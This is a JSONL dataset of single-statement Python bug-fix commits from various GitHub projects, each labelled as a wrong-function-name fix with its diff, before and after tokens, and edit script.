{"project": "cdlib", "commit_sha": "af881dc7556b6256baf185f85190c53b623828fe", "parent_sha": "c7441dd61b1ce962371afe9506d16ccfc5a6d5d2", "file_path": "cdlib/evaluation/fitness.py", "project_url": "https://github.com/GiulioRossetti/cdlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -766,7 +766,7 @@ def surprise(graph, communities, **kwargs):\n         q = q / m\n         qa = qa / scipy.special.comb(n, 2, exact=True)\n \n-        sp = m * (q * np.log(q / qa) + (1 - q) * np.log2((1 - q) / (1 - qa)))\n+        sp = m * (q * np.log(q / qa) + (1 - q) * np.log((1 - q) / (1 - qa)))\n     except ZeroDivisionError:\n         pass\n \n", "before": "sp = m * ( q * np . log ( q / qa ) + ( 1 - q ) * np . log2 ( ( 1 - q ) / ( 1 - qa ) ) )", "after": "sp = m * ( q * np . log ( q / qa ) + ( 1 - q ) * np . log ( ( 1 - q ) / ( 1 - qa ) ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:log2\", 3, 53, 3, 57], \"log\"]]"}
{"project": "feedsubs", "commit_sha": "e348f836519c0842a37554ed97d4ef76db13b78a", "parent_sha": "91c9404a5d7e065220ea228c2eef6e86ee2d5670", "file_path": "reader/http_fetcher.py", "project_url": "https://github.com/NicolasLM/feedsubs", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -77,7 +77,7 @@ def _check_content_length(r: requests.Response):\n     \"\"\"Ensure that response Content-Length is below the threshold.\"\"\"\n     content_length = r.headers.get('Content-Length')\n     if content_length is None:\n-        logger.info('Cannot check length before downloading file')\n+        logger.debug('Cannot check length before downloading file')\n         return\n \n     if int(content_length) > MAX_DOWNLOAD_BYTES:\n", "before": "logger . info ( 'Cannot check length before downloading file' )", "after": "logger . debug ( 'Cannot check length before downloading file' )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:info\", 3, 16, 3, 20], \"debug\"]]"}
{"project": "starcoder", "commit_sha": "8bf0f878d33a431f948bac9adf757ba06b61d19e", "parent_sha": "0fcf5d3bc5a8aeabb7159ee27f55185884c31ccc", "file_path": "gr-starcoder/python/qa_command_source.py", "project_url": "https://github.com/infostellarinc/starcoder", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -112,7 +112,7 @@ class qa_command_source (gr_unittest.TestCase):\n         msg.uniform_vector_value.u_value.value.extend([12, 0, 3])\n         msg.uniform_vector_value.u_value.size = starcoder_pb2.Size8\n \n-        expected = pmt.init_s32vector(3, [12, 0, 3])\n+        expected = pmt.init_u8vector(3, [12, 0, 3])\n \n         self.tb.start()\n         cs.push(msg.SerializeToString())\n", "before": "expected = pmt . init_s32vector ( 3 , [ 12 , 0 , 3 ] )", "after": "expected = pmt . init_u8vector ( 3 , [ 12 , 0 , 3 ] )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:init_s32vector\", 3, 24, 3, 38], \"init_u8vector\"]]"}
{"project": "LogESP", "commit_sha": "511f34a969a4d771c99d2521d8f4f387b1a6e6fe", "parent_sha": "c095f045d7778958928abd7d4c2296a41a438ee6", "file_path": "daemons/parser/parsecore.py", "project_url": "https://github.com/dogoncouch/LogESP", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -72,7 +72,7 @@ class ParseCore:\n             try:\n                 helpertype = config.get(sec,\n                         'helper_type')\n-                p['parse_helpers'] = ParseHelper.objects.get(\n+                p['parse_helpers'] = ParseHelper.objects.filter(\n                         helper_type=helpertype)\n             except Exception:\n                 p['parse_helpers'] = []\n", "before": "p [ 'parse_helpers' ] = ParseHelper . objects . get ( helper_type = helpertype )", "after": "p [ 'parse_helpers' ] = ParseHelper . objects . filter ( helper_type = helpertype )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:get\", 3, 58, 3, 61], \"filter\"]]"}
{"project": "prog-o-meter", "commit_sha": "e33416148256eb01ce71cd23a8e56264f73c02b7", "parent_sha": "ba6a391f325e3a02fe113dc659d15c70fa599c78", "file_path": "prog-o-meter.py", "project_url": "https://github.com/lineaba/prog-o-meter", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -252,7 +252,7 @@ class UsernameGUI(object):\n         self.canvas.pack()\r\n         self.text_entry = Tk.Entry(self.root)\r\n         self.text_entry.pack()\r\n-        self.text_entry.focus_set()\r\n+        self.text_entry.focus_force()\r\n         if self.user_type == 1:        # Display appropriate greeting for returning users\r\n             self.canvas.create_text(self.CANVAS_WIDTH/2, 20, text = \"Good to see you again! Please enter your name\")\r\n         elif self.user_type == 2:        # Display appropriate greeting for new users\r\n", "before": "self . text_entry . focus_set ( )", "after": "self . text_entry . focus_force ( )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:focus_set\", 3, 25, 3, 34], \"focus_force\"]]"}
{"project": "opensoft18", "commit_sha": "096d86f7446c7c41f925c532902c8b8be10435d8", "parent_sha": "6310e9858800e1f5ac0f2d79f4b8404d9af7b25e", "file_path": "backend/utilities/digicon_classes.py", "project_url": "https://github.com/lbs-iitkgp/opensoft18", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -64,7 +64,7 @@ class boundingBox:\n             coordinate(min(this_box.tl.x, another_box.tl.x), min(this_box.tl.y, another_box.tl.y)),\n             coordinate(max(this_box.tr.x, another_box.tr.x), min(this_box.tr.y, another_box.tr.y)),\n             coordinate(min(this_box.bl.x, another_box.bl.x), max(this_box.bl.y, another_box.bl.y)),\n-            coordinate(max(this_box.br.x, another_box.br.x), min(this_box.br.y, another_box.br.y)),\n+            coordinate(max(this_box.br.x, another_box.br.x), max(this_box.br.y, another_box.br.y)),\n             this_box.bound_text+another_box.bound_text, 'W', []\n         )\n \n", "before": "coordinate ( max ( this_box . br . x , another_box . br . x ) , min ( this_box . br . y , another_box . br . y ) ) ,", "after": "coordinate ( max ( this_box . br . x , another_box . br . x ) , max ( this_box . br . y , another_box . br . y ) ) ,", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:min\", 3, 62, 3, 65], \"max\"]]"}
{"project": "deep-learning-from-scratch", "commit_sha": "911528e2a3ea912e4605f4c2ddfaf39d56c16764", "parent_sha": "544af4086f7079e77bde060b9edc1f8a1378dbed", "file_path": "ch04/gradient_simplenet.py", "project_url": "https://github.com/s-wiki/deep-learning-from-scratch", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -8,7 +8,7 @@ from common.gradient import numerical_gradient\n \n class simpleNet:\n     def __init__(self):\n-        self.W = np.random.rand(2,3)\n+        self.W = np.random.randn(2,3)\n \n     def predict(self, x):\n", "before": "self . W = np . random . rand ( 2 , 3 )", "after": "self . W = np . random . randn ( 2 , 3 )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:rand\", 3, 28, 3, 32], \"randn\"]]"}
{"project": "wtk", "commit_sha": "494671b10779b5e5237967cc62f5114cd388fb25", "parent_sha": "ff906116476dd7a654b7064e5752a3a78de94faf", "file_path": "update_copyright/vcs/__init__.py", "project_url": "https://github.com/Warbo/wtk", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -43,7 +43,7 @@ class VCSBackend (object):\n         if filename is None:\n             years.update(self._year_hacks.values())\n         elif _utils.splitpath(filename) in self._year_hacks:\n-            years.update(self._year_hacks[_utils.splitpath(filename)])\n+            years.add(self._year_hacks[_utils.splitpath(filename)])\n         years = sorted(years)\n         return years[0]\n \n", "before": "years . update ( self . _year_hacks [ _utils . splitpath ( filename ) ] )", "after": "years . add ( self . _year_hacks [ _utils . splitpath ( filename ) ] )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:update\", 3, 19, 3, 25], \"add\"]]"}
{"project": "domain_tools", "commit_sha": "174f74e8fa986b98331c0c3ef83a6a67d90a745c", "parent_sha": "99886b47acced630310fdf56fa2fc99e7019fe96", "file_path": "test/test_get_ldap_users.py", "project_url": "https://github.com/jia3ep/domain_tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -164,7 +164,7 @@ class TestSave(unittest.TestCase):\n             total = get_ldap_users.save_records_to_csv(entries, settings.field_mapping, output_file)\n             self.assertEquals(total, 2)\n             output_file.seek(0)\n-            data = output_file.read()\n+            data = output_file.readline()\n             self.assertEquals(data, 'admin;a@a.a\\n')\n \n \n", "before": "data = output_file . read ( )", "after": "data = output_file . readline ( )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:read\", 3, 32, 3, 36], \"readline\"]]"}
{"project": "XwareDesktop", "commit_sha": "44852bb68cf8a8991a2ecf3dd9628d6031e7359a", "parent_sha": "68f87ff758351d68f3a64440b3e018d357f83206", "file_path": "src/daemon/xwared.py", "project_url": "https://github.com/mmczoo/XwareDesktop", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -182,7 +182,7 @@ class Xwared(object):\n \n     def interface_start(self):\n         if self.settings.getint(\"xwared\", \"startetmwhen\") == 3:\n-            self.runETM()\n+            self.interface_startETM()\n             self.settings.setbool(\"xwared\", \"startetm\", True)\n             self.settings.save()\n \n", "before": "self . runETM ( )", "after": "self . interface_startETM ( )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:runETM\", 3, 18, 3, 24], \"interface_startETM\"]]"}
{"project": "XwareDesktop", "commit_sha": "0b37f7a059d67b6004ced1e7ce9930b8affa51b1", "parent_sha": "542eaebd16cb44e5072de967fb32e0d1a4f8c58a", "file_path": "src/frontend/libxware/vanilla.py", "project_url": "https://github.com/mmczoo/XwareDesktop", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -241,7 +241,7 @@ class XwareClient(object):\n         for key, value in settings.items():\n             assert key in Settings._fields\n             params.append(\"{k}={v}\".format(k = key, v = value))\n-        result = yield from self.postJsonP2(\"settings?v=2&\" + \"&\".join(params))\n+        result = yield from self.postJson2(\"settings?v=2&\" + \"&\".join(params))\n         return result\n \n     @asyncio.coroutine\n", "before": "result = yield from self . postJsonP2 ( \"settings?v=2&\" + \"&\" . join ( params ) )", "after": "result = yield from self . postJson2 ( \"settings?v=2&\" + \"&\" . join ( params ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:postJsonP2\", 3, 34, 3, 44], \"postJson2\"]]"}
{"project": "sympy", "commit_sha": "20f9323c5615168b5c01b8d0acd8824c89b14108", "parent_sha": "896f9cf9ba440c09ed86374986828886e1b5e69b", "file_path": "sympy/core/basic.py", "project_url": "https://github.com/grannydatasoup/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -294,7 +294,7 @@ def fromiter(cls, args, **assumptions):\n         ========\n \n         >>> from sympy import Tuple\n-        >>> Tuple.fromiter(i for i in xrange(5))\n+        >>> Tuple.fromiter(i for i in range(5))\n         (0, 1, 2, 3, 4)\n \n", "before": "Tuple . fromiter ( i for i in xrange ( 5 ) )", "after": "Tuple . fromiter ( i for i in range ( 5 ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:xrange\", 3, 39, 3, 45], \"range\"]]"}
{"project": "horizon", "commit_sha": "217a17a7f457e2895f41b9ac48c445c8dcce4197", "parent_sha": "d227402f566d63435cbce72c584ceb437fb4c192", "file_path": "openstack_dashboard/test/test_data/sahara_data.py", "project_url": "https://github.com/mkowalski/horizon", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -34,7 +34,7 @@ def data(TEST):\n     TEST.job_binaries = utils.TestDataContainer()\n     TEST.jobs = utils.TestDataContainer()\n     TEST.job_executions = utils.TestDataContainer()\n-    TEST.registered_images = copy.deepcopy(TEST.images)\n+    TEST.registered_images = copy.copy(TEST.images)\n \n     plugin1_dict = {\n         \"description\": \"vanilla plugin\",\n", "before": "TEST . registered_images = copy . deepcopy ( TEST . images )", "after": "TEST . registered_images = copy . copy ( TEST . images )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:deepcopy\", 3, 35, 3, 43], \"copy\"]]"}
{"project": "r-bridge-install", "commit_sha": "c38f097dc5a10591528443294aa8523c96cf3bad", "parent_sha": "c2ec8b2ed05ccde251e183a08bfcacaf5b995dcc", "file_path": "rtools/install_package.py", "project_url": "https://github.com/PeterTFS/r-bridge-install", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -86,7 +86,7 @@ def install_package(overwrite=False, r_library_path=r_library_path):\n     if bridge_running(product):\n         msg = \"The ArcGIS R bridge is currently in-use, restart the \" + \\\n               \"application and try again.\"\n-        arcpy.AddMessage(msg)\n+        arcpy.AddError(msg)\n         sys.exit()\n \n     # detect if we we have a 10.3.1 install that needs linking\n", "before": "arcpy . AddMessage ( msg )", "after": "arcpy . AddError ( msg )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:AddMessage\", 3, 15, 3, 25], \"AddError\"]]"}
{"project": "GMhil", "commit_sha": "d5ae5c087a8f0637c526e1bbc353ff101e770f3d", "parent_sha": "498df22a8cbe94aab5126ba2c564204fb3a1aaaf", "file_path": "haas/cli.py", "project_url": "https://github.com/gfaline/GMhil", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -184,7 +184,7 @@ def headnode_start(headnode):\n def headnode_stop(headnode):\n     \"\"\"Stop <headnode>\"\"\"\n     url = object_url('headnode', headnode, 'stop')\n-    check_stauts_code(requests.post(url))\n+    check_status_code(requests.post(url))\n \n @cmd\n def node_register(node):\n", "before": "check_stauts_code ( requests . post ( url ) )", "after": "check_status_code ( requests . post ( url ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:check_stauts_code\", 3, 5, 3, 22], \"check_status_code\"]]"}
{"project": "BA-Software", "commit_sha": "628421ca5f79ccbcd5afdaa25eca6f5289e266f4", "parent_sha": "bccf19fc3728867f6f8340d077fa35d470cfa716", "file_path": "gate/system/__init__.py", "project_url": "https://github.com/Barmaley13/BA-Software", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -164,7 +164,7 @@ class SystemSettings(DatabaseDict):\n             print('Language: {}'.format(self.language))\n             print('Modbus Enable: {}'.format(self.modbus_enable))\n             print('SNMP Enable: {}'.format(self.snmp_enable))\n-            print('Virgins Enable: {}'.foramt(self.virgins_enable))\n+            print('Virgins Enable: {}'.format(self.virgins_enable))\n             print('FAQ Enable: {}'.format(self.faq_enable))\n             print('Manual Log Enable: {}'.format(self.manual_log))\n             print(self.time_settings_str())\n", "before": "print ( 'Virgins Enable: {}' . foramt ( self . virgins_enable ) )", "after": "print ( 'Virgins Enable: {}' . format ( self . virgins_enable ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:foramt\", 3, 40, 3, 46], \"format\"]]"}
{"project": "sonic-client", "commit_sha": "3d1302757cf17a3ce38dde6f7ebd29c4d32bfdaf", "parent_sha": "c5e26c44c261fb8604aaf77f5406120b59164f3f", "file_path": "sonic_client/sonic_client.py", "project_url": "https://github.com/sumanthns/sonic-client", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -26,7 +26,7 @@ class SonicClient(object):\n         try:\n             #message = json.loads(decrypt(body))\n             message = json.loads(body)\n-            for key, val in message.iter_items():\n+            for key, val in message.iteritems():\n                 if hasattr(self.manager, key):\n                     getattr(self.manager, key)(val)\n                 else:\n", "before": "for key , val in message . iter_items ( ) : if hasattr ( self . manager , key ) : getattr ( self . manager , key ) ( val ) else : ", "after": "for key , val in message . iteritems ( ) : if hasattr ( self . manager , key ) : getattr ( self . manager , key ) ( val ) else : ", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:iter_items\", 3, 37, 3, 47], \"iteritems\"]]"}
{"project": "plone.server", "commit_sha": "a0cde5e67276d8de4ffee753481fcd13b371ab46", "parent_sha": "b0d7ff6a0578fcac98f1ff28f1b9f5cf494fb36e", "file_path": "src/plone.server/plone/server/content.py", "project_url": "https://github.com/zmijunkie/plone.server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -37,7 +37,7 @@ class PloneSite(Container):\n \n         # Default policy\n         roles = IRolePermissionManager(self)\n-        roles.grantPermissionForRole(\n+        roles.grantPermissionToRole(\n             DEFAULT_READ_PERMISSION,\n             'Anonymous User'\n         )\n", "before": "roles . grantPermissionForRole ( DEFAULT_READ_PERMISSION , 'Anonymous User' )", "after": "roles . grantPermissionToRole ( DEFAULT_READ_PERMISSION , 'Anonymous User' )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:grantPermissionForRole\", 3, 15, 3, 37], \"grantPermissionToRole\"]]"}
{"project": "ckanext-harvest", "commit_sha": "8e862c8f04774662a14b5a3f1787a12fbec92306", "parent_sha": "5c9c0938032e0837862f3819de2f92b8e3df5f60", "file_path": "ckanext/harvest/logic/action/create.py", "project_url": "https://github.com/GovDataOfficial/ckanext-harvest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ def harvest_job_create(context, data_dict):\n     source = HarvestSource.get(source_id)\n     if not source:\n         log.warn('Harvest source %s does not exist', source_id)\n-        raise toolkit.NotFound('Harvest source %s does not exist' % source_id)\n+        raise toolkit.ObjectNotFound('Harvest source %s does not exist' % source_id)\n \n     # Check if the source is active\n     if not source.active:\n", "before": "raise toolkit . NotFound ( 'Harvest source %s does not exist' % source_id )", "after": "raise toolkit . ObjectNotFound ( 'Harvest source %s does not exist' % source_id )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:NotFound\", 3, 23, 3, 31], \"ObjectNotFound\"]]"}
{"project": "cache", "commit_sha": "8e9dde12a154180dd30abf4976c042732b99db42", "parent_sha": "3b34be3ade0198fc88d4e7f64047fd4819c142c7", "file_path": "cache/cache.py", "project_url": "https://github.com/Ohjeah/cache", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -76,7 +76,7 @@ class FileCache(CacheMixin):\n         return result\n \n     def __setitem__(self, key, value):\n-        with open(self.name(key), 'wb') as f:\n+        with open(self.fname(key), 'wb') as f:\n             dill.dump(value, f)\n \n \n", "before": "with open ( self . name ( key ) , 'wb' ) as f : dill . dump ( value , f )", "after": "with open ( self . fname ( key ) , 'wb' ) as f : dill . dump ( value , f )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:name\", 3, 24, 3, 28], \"fname\"]]"}
{"project": "vjezd", "commit_sha": "fdfe247ac8367e3253f64ab92839580447d78f2e", "parent_sha": "b8662a984438581a1a9cbcee42142944a017e388", "file_path": "vjezd/ports/printer/cups.py", "project_url": "https://github.com/blami/vjezd", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -108,7 +108,7 @@ class CUPSPrinter(PDFPrinter):\n         else:\n             printer = conn.getDefault()\n         if not printer:\n-            raise CUPSPrinterError('Non-existent CUPS printer: {}'.format(\n+            raise CUPSPrinterTestError('Non-existent CUPS printer: {}'.format(\n                 self.cups_printer_name or 'default'))\n         conn = None\n \n", "before": "raise CUPSPrinterError ( 'Non-existent CUPS printer: {}' . format ( self . cups_printer_name or 'default' ) )", "after": "raise CUPSPrinterTestError ( 'Non-existent CUPS printer: {}' . format ( self . cups_printer_name or 'default' ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:CUPSPrinterError\", 3, 19, 3, 35], \"CUPSPrinterTestError\"]]"}
{"project": "features", "commit_sha": "42ed45d125fdd826de13ae58be5f8fef2e14f995", "parent_sha": "901583bf31998bf6a0e6acba7c0803911711333f", "file_path": "src/recipes/0000000000000007/recipe.py", "project_url": "https://github.com/ScreamingUdder/features", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -112,7 +112,7 @@ def validate(entry):\n     context = {}\r\n     values = {}\r\n     fails = []\r\n-    for item, (optional, tests) in VALIDATE.iteritems():\r\n+    for item, (optional, tests) in VALIDATE.items():\r\n         if check_path(entry, item):\r\n             for test in tests:\r\n                 test(context, entry, item, values, fails)\r\n", "before": "for item , ( optional , tests ) in VALIDATE . iteritems ( ) : if check_path ( entry , item ) : for test in tests : test ( context , entry , item , values , fails )", "after": "for item , ( optional , tests ) in VALIDATE . items ( ) : if check_path ( entry , item ) : for test in tests : test ( context , entry , item , values , fails )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:iteritems\", 3, 45, 3, 54], \"items\"]]"}
{"project": "xos-1", "commit_sha": "198027cb818df8f99662f78e0eeb79a9267dcf8e", "parent_sha": "5271d6bbc679aec254df50b04f7c05d7a9e9bffa", "file_path": "plstackapi/planetstack/api/roles.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -4,9 +4,9 @@ from plstackapi.planetstack.models import *\n \n \n def auth_check(auth):\n-    client = OpenStackShell(username=auth['Username'],\n-                            password=auth['AuthMethod'],\n-                            tenant=auth['LoginBase'])\n+    client = OpenStackDriver(username=auth['Username'],\n+                             password=auth['AuthMethod'],\n+                             tenant=auth['LoginBase'])\n     client.authenticate()\n     return client\n \n", "before": "client = OpenStackShell ( username = auth [ 'Username' ] , password = auth [ 'AuthMethod' ] , tenant = auth [ 'LoginBase' ] )", "after": "client = OpenStackDriver ( username = auth [ 'Username' ] , password = auth [ 'AuthMethod' ] , tenant = auth [ 'LoginBase' ] )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:OpenStackShell\", 3, 14, 3, 28], \"OpenStackDriver\"]]"}
{"project": "xos-1", "commit_sha": "dec8f4ad43b2852bed15ff6a88890262d0ae126c", "parent_sha": "c2a1c7cf6167512bd1a964f8e98a0e0ac164c279", "file_path": "plstackapi/planetstack/api/keys.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -32,7 +32,7 @@ def delete_key(auth, filter={}):\n     driver = OpenStackDriver(client = auth_check(auth))   \n     keys = Key.objects.filter(**filter)\n     for key in keys:\n-        driver.delete_key(name=key.name) \n+        driver.delete_keypair(name=key.name) \n         key.delete()\n     return 1\n \n", "before": "driver . delete_key ( name = key . name )", "after": "driver . delete_keypair ( name = key . name )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:delete_key\", 3, 16, 3, 26], \"delete_keypair\"]]"}
{"project": "xos-1", "commit_sha": "4325eb065a16d6da4efebba362f5c2fb836f4b77", "parent_sha": "ee1b950dde793312e4928b2e067db9215f57ceba", "file_path": "xos/core/xoslib/methods/vtn.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -55,7 +55,7 @@ class VTNViewSet(XOSViewSet):\n \n     def get_service(self, request, pk=None, service=None):\n         for xos_service in Service.objects.all():\n-            if service in xos_service.get_vtn_ids():\n+            if service in xos_service.get_vtn_src_ids():\n                 return Response(xos_service.get_vtn_dependencies_ids())\n         raise DoesNotExist()\n \n", "before": "if service in xos_service . get_vtn_ids ( ) : return Response ( xos_service . get_vtn_dependencies_ids ( ) )", "after": "if service in xos_service . get_vtn_src_ids ( ) : return Response ( xos_service . get_vtn_dependencies_ids ( ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:get_vtn_ids\", 3, 39, 3, 50], \"get_vtn_src_ids\"]]"}
{"project": "xos-1", "commit_sha": "9d5694ea564e13939cdcd3be815c47194f8a5cfc", "parent_sha": "461180a9e90a5c181b9fd5e7a0899a8118f06449", "file_path": "xos/services/vpn/admin.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -301,7 +301,7 @@ class VPNTenantAdmin(ReadOnlyAwareAdmin):\n                         \"build-client-full \" + certificate + \" nopass\")\n                     obj.tenant.enacted = None\n                     obj.tenant.save()\n-                    obj.delete()\n+                    obj.save()\n \n # Associate the admin forms with the models.\n admin.site.register(VPNService, VPNServiceAdmin)\n", "before": "obj . delete ( )", "after": "obj . save ( )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:delete\", 3, 25, 3, 31], \"save\"]]"}
{"project": "sar-pre-processing", "commit_sha": "e3e5e2012192b57564326e4e506b25632f63b26e", "parent_sha": "0fa18ed738073ff11a7c8b41110870aeb7aa69a5", "file_path": "sar_pre_processing/sar_pre_processor.py", "project_url": "https://github.com/multiply-org/sar-pre-processing", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -99,7 +99,7 @@ class SARPreProcessor(PreProcessor):\n                 else:\n                     raise UserWarning(f'Could not determine location of {self.config[key_name]}.')\n         else:\n-            default_graph = pkg_resources.resource_stream('sar_pre_processing.default_graphs', default_name)\n+            default_graph = pkg_resources.resource_filename('sar_pre_processing.default_graphs', default_name)\n             self.config.add_entry(key_name, default_graph)\n \n     def set_file_list(self, file_list: List[str]):\n", "before": "else : default_graph = pkg_resources . resource_stream ( 'sar_pre_processing.default_graphs' , default_name )", "after": "else : default_graph = pkg_resources . resource_filename ( 'sar_pre_processing.default_graphs' , default_name )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:resource_stream\", 3, 43, 3, 58], \"resource_filename\"]]"}
{"project": "askbot-devel", "commit_sha": "54015ae828eabc5fc5a4b26b2f98a9cf9a201393", "parent_sha": "d7fea908bd6caa677ea96371af43f2b5f823f2ee", "file_path": "askbot/utils/markup.py", "project_url": "https://github.com/kingctan/askbot-devel", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -209,7 +209,7 @@ def markdown_input_converter(text):\n \n def tinymce_input_converter(text):\n     \"\"\"tinymce input to production html converter\"\"\"\n-    text = urlize(text)\n+    text = urlize_html(text)\n     return strip_tags(text, ['script', 'style', 'link'])\n \n def convert_text(text):\n", "before": "text = urlize ( text )", "after": "text = urlize_html ( text )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:urlize\", 3, 12, 3, 18], \"urlize_html\"]]"}
{"project": "Cura", "commit_sha": "6783b4b3ef444654ab8aa5aada0c31cac3d44ccb", "parent_sha": "61477078a47ff03e16c0f358e969ff6371c98fa3", "file_path": "cura/ConvexHullDecorator.py", "project_url": "https://github.com/themaninthesuitcase/Cura", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -240,7 +240,7 @@ class ConvexHullDecorator(SceneNodeDecorator):\n         elif adhesion_type == \"skirt\":\n             extra_margin = max(\n                 0, self._getSettingProperty(\"skirt_gap\", \"value\") +\n-                   self._getSettingPropertyy(\"skirt_line_count\", \"value\") * self._getSettingProperty(\"skirt_brim_line_width\", \"value\"))\n+                   self._getSettingProperty(\"skirt_line_count\", \"value\") * self._getSettingProperty(\"skirt_brim_line_width\", \"value\"))\n         else:\n             raise Exception(\"Unknown bed adhesion type. Did you forget to update the convex hull calculations for your new bed adhesion type?\")\n \n", "before": "max ( 0 , self . _getSettingProperty ( \"skirt_gap\" , \"value\" ) + self . _getSettingPropertyy ( \"skirt_line_count\" , \"value\" ) * self . _getSettingProperty ( \"skirt_brim_line_width\" , \"value\" ) )", "after": "max ( 0 , self . _getSettingProperty ( \"skirt_gap\" , \"value\" ) + self . _getSettingProperty ( \"skirt_line_count\" , \"value\" ) * self . _getSettingProperty ( \"skirt_brim_line_width\" , \"value\" ) )", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:_getSettingPropertyy\", 3, 25, 3, 45], \"_getSettingProperty\"]]"}
{"project": "RatticWeb", "commit_sha": "c0a70e2ba7ae9e1393a560b1915ef90d0637b462", "parent_sha": "8be41f00f7dc7fd5b70ca90455367994db9bf8c4", "file_path": "cred/api.py", "project_url": "https://github.com/efornal/RatticWeb", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ class CredAuthorization(Authorization):\n \n     def read_detail(self, object_list, bundle):\n         # Check user has perms\n-        if not bundle.obj.is_owned_by(bundle.request.user):\n+        if not bundle.obj.is_visible_by(bundle.request.user):\n             return False\n \n         # This audit should go somewhere else, is there a detail list function we can override?\n", "before": "if not bundle . obj . is_owned_by ( bundle . request . user ) : return False", "after": "if not bundle . obj . is_visible_by ( bundle . request . user ) : return False", "sstub_pattern": "WRONG_FUNCTION_NAME", "edit_script": "[[\"Update\", [\"identifier:is_owned_by\", 3, 27, 3, 38], \"is_visible_by\"]]"}
